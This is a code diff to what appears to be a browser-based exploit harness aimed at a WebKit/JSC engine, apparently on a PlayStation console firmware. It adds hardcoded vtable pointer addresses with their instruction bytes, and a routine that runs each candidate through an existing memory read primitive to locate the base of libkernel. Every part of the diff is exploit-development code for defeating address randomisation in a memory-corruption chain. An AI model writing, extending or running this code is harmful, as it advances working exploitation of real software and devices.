@@ -38,7 +38,7 @@ import {
 } from "./libkernel_resolve.js";
 
 const params = new URLSearchParams(location.search);
-const BUILD_ID = "rw-20250829o";
+const BUILD_ID = "rw-20250829p";
 /** opt-in only — release triggers JSC GC */
 const PROMOTE_PAIR = params.get("promote") === "1";
 const RESTORE_LOG = params.get("restorelog") === "1";
@@ -335,12 +335,45 @@ function isGetpidStub(v) {
     return lkIsGetpidStub(v);
 }
 
+/** cal 2e EXT-PTR (13.52 HW — skip vtable[1,3,4,5,9] webkit 0xe5894855). */
+const CAL_VTABLE_PTRS = [
+    { label: "vtable[0]", ptr: "83ed11770", code: "0x45b8" },
+    { label: "vtable[2]", ptr: "83d49dce0", code: "0x90c3c031" },
+    { label: "vtable[6]", ptr: "83dc68320", code: "0xf9dd6be9" },
+    { label: "vtable[7]", ptr: "83e21dc30", code: "0x909090c3" },
+    { label: "vtable[8]", ptr: "83f35f410", code: "0x7e938be9" },
+    { label: "vtable[10]", ptr: "83e153870", code: "0x909090c3" },
+    { label: "vtable[11]", ptr: "83f34c110", code: "0x2184783" },
+];
+const SS_CAL_EXT_PTRS = "wk-cal-ext-ptrs";
+
+function calExtPtrCandidates() {
+    const out = CAL_VTABLE_PTRS.slice();
+    try {
+        const raw = sessionStorage.getItem(SS_CAL_EXT_PTRS);
+        if (!raw) return out;
+        const extra = JSON.parse(raw);
+        if (!Array.isArray(extra)) return out;
+        const seen = new Set(out.map(e => e.ptr.toLowerCase()));
+        for (let i = 0; i < extra.length; i++) {
+            const e = extra[i];
+            const ptr = (e.ptr || e.hex || "").replace(/^0x/i, "").toLowerCase();
+            if (!ptr || seen.has(ptr)) continue;
+            if (e.code === "0xe5894855" || e.code === "e5894855") continue;
+            seen.add(ptr);
+            out.push({ label: e.label || "cal", ptr, code: e.code || "?" });
+        }
+    } catch (_) { }
+    return out;
+}
+
 /** Manual tests — one button = minimal reads, one log line. */
 const MANUAL_TESTS = [
     { id: "elf", group: "base", label: "ELF @ base" },
     { id: "native", group: "base", label: "nativeFn code" },
     { id: "scan-iat", group: "base", label: "Scan libkernel" },
     { id: "leak-lk", group: "base", label: "Leak+vtable LK" },
+    { id: "try-cal-ptrs", group: "base", label: "Try cal ptrs" },
     { id: "show-lk", group: "base", label: "Show LK hints" },
     { id: "paste-lk", group: "base", label: "Paste libkernel" },
     { id: "libkernel", group: "base", label: "libkernel" },
@@ -452,6 +485,15 @@ function runManualTest(testId) {
         }
         if (testId === "leak-lk") {
             runLeakLkScan().catch(function (err) {
+                mark("LK-FAIL", err.message || String(err));
+                busy = false;
+                setUi();
+                renderOut();
+            });
+            return;
+        }
+        if (testId === "try-cal-ptrs") {
+            runTryCalPtrs().catch(function (err) {
                 mark("LK-FAIL", err.message || String(err));
                 busy = false;
                 setUi();
@@ -1732,6 +1774,49 @@ async function runShowLkHints() {
 }
 
 let leakScanState = null;
+
+async function runTryCalPtrs() {
+    if (!ready || !window.p || busy) return;
+    const p = window.p;
+    const off = loadEffectiveOff();
+    const { webkitBase } = basesFromSession(off);
+    if (!webkitBase) {
+        mark("LK-SKIP", "no webkitBase — Save bases first");
+        return;
+    }
+    const cands = calExtPtrCandidates();
+    busy = true;
+    setUi();
+    mark("LK-CAL", "build=" + BUILD_ID + " trying " + cands.length + " cal EXT-PTR (walk-back)");
+    scanState("cal ptrs…");
+    try {
+        for (let i = 0; i < cands.length; i++) {
+            const c = cands[i];
+            mark("LK-CAL-TRY", c.label + " " + c.ptr + " code=" + c.code);
+            if (addrIn) addrIn.value = c.ptr;
+            const v = verifyManualLibkernelFromPtr(p, c.ptr, off);
+            if (v.ok) {
+                mark("LK-OK", c.label + " → " + v.lk + " (" + (v.via || "?") + ")");
+                state("libkernel via " + c.label, "ok");
+                renderOut();
+                flushPersistMilestones();
+                return;
+            }
+            mark("LK-CAL-MISS", c.label + " — " + (v.error || "not libkernel"));
+            await new Promise(r => setTimeout(r, 8));
+        }
+        mark("LK-CAL-DONE", "all " + cands.length + " miss — paste single ptr or Leak+vtable LK");
+        state("cal ptrs miss", "bad");
+    } catch (err) {
+        mark("LK-FAIL", err.message || String(err));
+        state("cal ptr error", "bad");
+    } finally {
+        busy = false;
+        setUi();
+        renderOut();
+        flushPersistMilestones();
+    }
+}
 
 async function runLeakLkScan() {
     if (!ready || !window.p || busy) return;
